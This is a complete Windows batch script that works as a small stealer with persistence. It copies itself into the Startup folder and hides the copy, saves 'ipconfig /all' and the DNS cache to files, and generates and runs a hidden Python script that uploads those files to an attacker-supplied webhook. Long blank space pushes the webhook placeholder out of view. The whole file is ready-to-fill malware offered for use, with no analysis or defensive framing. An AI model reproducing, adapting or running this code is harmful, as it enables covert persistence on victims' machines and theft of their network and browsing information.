@echo off
set own=%~dp0
set data=%~dpnx0
set fnamext=%~nx0

goto test

:tet
cd %own%
:check
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%fnamext%" goto log
copy "%cd%\%fnamext%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%fnamext%"
attrib "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%fnamext%" +h
goto log

:log
ipconfig /all > "%cd%\data.txt" && ipconfig /displaydns > "%cd%\data2.txt"
pip install requests >nul
echo import requests > nothing.txt
echo myurl = '%webhook%' >> nothing.txt
echo f = {'file data': open('data.txt', 'rb')} >> nothing.txt
echo res = requests.post(myurl, files=f) >> nothing.txt
echo g = {'file data': open('data2.txt', 'rb')} >> nothing.txt
echo res = requests.post(myurl, files=g) >> nothing.txt
ren nothing.txt nothing.py
start /min nothing.py
cls
attrib *.* +h

































:test
set webhook=YOURwebhookHERE
goto tet
